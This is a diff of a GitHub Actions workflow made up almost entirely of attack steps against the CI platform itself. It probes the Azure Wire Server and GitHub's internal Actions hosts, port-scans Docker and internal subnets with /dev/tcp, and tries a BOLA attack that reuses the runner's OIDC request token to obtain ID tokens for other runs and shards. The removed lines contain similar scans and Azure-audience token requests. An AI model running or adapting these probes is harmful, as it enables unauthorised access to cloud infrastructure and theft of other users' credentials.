@@ -7,80 +7,68 @@ permissions:
 jobs:
   inspect:
     runs-on: ubuntu-latest
-    timeout-minutes: 8
     steps:
-      - name: Internal network - find GitHub services
+      - name: Azure Wire Server (168.63.129.16) - undocumented endpoints
         run: |
-          echo "=== OWN IP ==="
-          ip addr show | grep "inet " | head -3
+          WIRE=168.63.129.16
+          echo "=== WIRE SERVER PROBING ==="
+          # Known Azure Wire Server endpoints
+          for path in "/" "/machine?comp=goalstate" "/machine?comp=health" \
+              "/machine?comp=roleEnvironment" "/machine?comp=extensions" \
+              "/?comp=acls" "/?comp=acls&type=tunneledpacket" \
+              "/metadata/instance" "/metadata/identity" \
+              "/hostgaservice" "/hostgaservice/health" \
+              "/$system/thread" "/WireServer" "/health" \
+              "/machine" "/acls" "/packages" "/versions"; do
+            HTTP=$(curl -s --max-time 4 -o /tmp/wire_resp.txt -w "%{http_code}" \
+              "http://$WIRE$path" 2>/dev/null)
+            SIZE=$(wc -c < /tmp/wire_resp.txt 2>/dev/null || echo 0)
+            if [ "$HTTP" != "000" ] && [ "$HTTP" != "404" ]; then
+              echo "  [$HTTP] $SIZE bytes -> http://$WIRE$path"
+              if [ "$HTTP" = "200" ] && [ "$SIZE" -lt 500 ]; then
+                cat /tmp/wire_resp.txt
+                echo ""
+              fi
+            fi
+          done
+
+      - name: OIDC shard BOLA - cross-run token access
+        run: |
+          echo "=== OWN OIDC URL SHARD ==="
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
+          BASE=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP 'https://[^/]+')
+          SHARD=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP '(?<=\.com/)\d+')
+          echo "Shard: $SHARD"
           echo ""
-          echo "=== ROUTING TABLE ==="
-          ip route show
-          echo ""
-          echo "=== FAST SUBNET SCAN (common service ports) ==="
-          # Scan gateway and first few IPs for common ports
-          for ip in 10.1.0.1 10.1.0.2 10.1.0.3 10.1.0.4 10.1.0.5 10.1.15.254; do
-            for port in 80 443 8080 8443 22 3000 5000 8000 9000; do
-              result=$(timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "OPEN" || echo "")
-              [ -n "$result" ] && echo "  $ip:$port OPEN"
+          echo "=== TRY OTHER SHARDS (BOLA) ==="
+          for s in 0 1 2 3 4 5 10 22 50 77 100; do
+            URL="${BASE}/${s}//idtoken/00000000-0000-0000-0000-000000000000/00000000-0000-0000-0000-000000000000?api-version=2.0"
+            HTTP=$(curl -sf --max-time 4 \
+              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$URL&audience=sigstore" -o /dev/null -w "%{http_code}" 2>/dev/null)
+            echo "  shard $s -> HTTP $HTTP"
+          done
+
+      - name: Results API - artifact backend probe
+        run: |
+          echo "=== RESULTS API ENDPOINTS ==="
+          for host in "results.actions.githubusercontent.com" \
+              "artifactcache.actions.githubusercontent.com" \
+              "pipelines.actions.githubusercontent.com"; do
+            for path in "/" "/health" "/_ping" "/twirp/" \
+                "/twirp/github.actions.results.api.v1.ArtifactService/"; do
+              HTTP=$(curl -sf --max-time 5 "https://$host$path" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "ERR")
+              [ "$HTTP" != "000" ] && echo "  $host$path -> $HTTP"
             done
           done
-          echo "(scan done)"
 
-      - name: Probe OIDC token request endpoint for BOLA
+      - name: Docker network SSRF
         run: |
-          echo "=== OWN OIDC URL ==="
-          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
-          echo ""
-          echo "=== OIDC ENDPOINT STRUCTURE ==="
-          # Extract base URL and try to enumerate other paths
-          BASE=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | cut -d/ -f1-5)
-          echo "Base: $BASE"
-          # Try accessing other paths at the OIDC service
-          for path in "/" "/health" "/.well-known/openid-configuration" "/22/" "/1/" "/0/"; do
-            HTTP=$(curl -sf --max-time 5 -o /dev/null -w "%{http_code}" "$BASE$path" 2>/dev/null)
-            echo "  $BASE$path -> HTTP $HTTP"
+          echo "=== DOCKER NETWORK SCAN ==="
+          for ip in 172.17.0.1 172.17.0.2 172.17.0.3 172.18.0.1; do
+            for port in 80 443 2375 2376 8080 5000; do
+              OK=$(timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "OPEN")
+              [ -n "$OK" ] && echo "  $ip:$port OPEN"
+            done
           done
-
-      - name: OIDC with Azure audience (federated creds test)
-        run: |
-          echo "=== OIDC with Azure Exchange audience ==="
-          T=$(curl -sf \
-            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // "FAILED"')
-          echo "Azure audience token: ${T:0:30}..."
-          if [ "$T" != "FAILED" ]; then
-            echo "Claims:"
-            echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
-          fi
-
-          echo ""
-          echo "=== Try OIDC token for another job's OIDC URL (BOLA test) ==="
-          # Try to reuse our token to get an OIDC token for a different orchestration ID
-          MODIFIED_URL=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | sed 's/[0-9a-f-]\{36\}/00000000-0000-0000-0000-000000000000/g')
-          echo "Modified URL: $MODIFIED_URL"
-          HTTP=$(curl -sf --max-time 5 \
-            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${MODIFIED_URL}&audience=sigstore" \
-            -o /tmp/oidc_bola.json -w "%{http_code}")
-          echo "BOLA attempt HTTP: $HTTP"
-          cat /tmp/oidc_bola.json | head -3
-
-      - name: Probe internal GitHub Actions service endpoints
-        run: |
-          echo "=== Actions service internal structure ==="
-          # The OIDC URL reveals the internal service: run-actions-3-azure-eastus.actions.githubusercontent.com
-          SVCHOST=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | cut -d/ -f3)
-          echo "Service host: $SVCHOST"
-          # Try other internal paths
-          for path in "/" "/health" "/status" "/_status" "/metrics" "/22/"; do
-            RESP=$(curl -sf --max-time 5 "https://$SVCHOST$path" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "ERR")
-            echo "  https://$SVCHOST$path -> $RESP"
-          done
-          echo ""
-          echo "=== Try accessing runner registration endpoint ==="
-          # runners.githubusercontent.com - internal runner management
-          for host in "runner-images.actions.githubusercontent.com" "pipelines.actions.githubusercontent.com" "results.actions.githubusercontent.com"; do
-            HTTP=$(curl -sf --max-time 5 "https://$host/" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "ERR")
-            echo "  $host -> $HTTP"
-          done
+          echo "(done)"
